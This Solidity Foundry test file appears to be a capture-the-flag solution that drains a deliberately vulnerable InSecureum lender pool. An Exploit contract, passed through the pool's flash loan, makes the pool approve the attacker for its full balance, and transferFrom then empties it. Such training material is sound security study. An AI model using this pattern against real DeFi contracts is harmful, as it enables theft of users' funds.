// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";


contract Challenge1Test is Test {
    InSecureumLenderPool target; 
    IERC20 token;

    address player = makeAddr("player");

    function setUp() public {

        token = IERC20(address(new InSecureumToken(10 ether)));
        
        target = new InSecureumLenderPool(address(token));
        token.transfer(address(target), 10 ether);
        
        vm.label(address(token), "InSecureumToken");
    }

    function testChallenge() public {        
        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //=== this is a sample of flash loan usage
        //FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();

        console.log("[Before] player ISEC Token balance: ", token.balanceOf(player));

        uint256 contractBalance = token.balanceOf(address(target)); // get Contract Token Balance
        Exploit exploitContract = new Exploit(); // init exploit contract

        //init flashloan
        target.flashLoan(
          address(exploitContract),
          abi.encodeWithSignature(
            "grantApproval(address,uint256)", player, contractBalance
          )
        );

        //token transfer from Lenderpool to player
        token.transferFrom(address(target), player, contractBalance);

        console.log("[After] player ISEC Token balance: ", token.balanceOf(player));

        //===

        //============================//

        vm.stopPrank();

        assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
    }
}


/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

// @dev this is a demo contract that is used to receive the flash loan
contract FlashLoandReceiverSample {
    IERC20 public token;
    function receiveFlashLoan(address _user /* other variables */) public {
        // check tokens before doing arbitrage or liquidation or whatever
        uint256 balanceBefore = token.balanceOf(address(this));

        // do something with the tokens and get profit!


        uint256 balanceAfter = token.balanceOf(address(this));

        uint256 profit = balanceAfter - balanceBefore;
        if (profit > 0) {
            token.transfer(_user, balanceAfter - balanceBefore);
        }
    }
}

// @dev this is the solution
contract Exploit {
    address token;

    //the caller of the function selector will the lenderPool
    //the approve function is called on behalf of the pool address
    //grant the player access to the tokens
    function grantApproval(address player, uint256 contractBalance) public {
        IERC20(token).approve(player, contractBalance);
    }

}
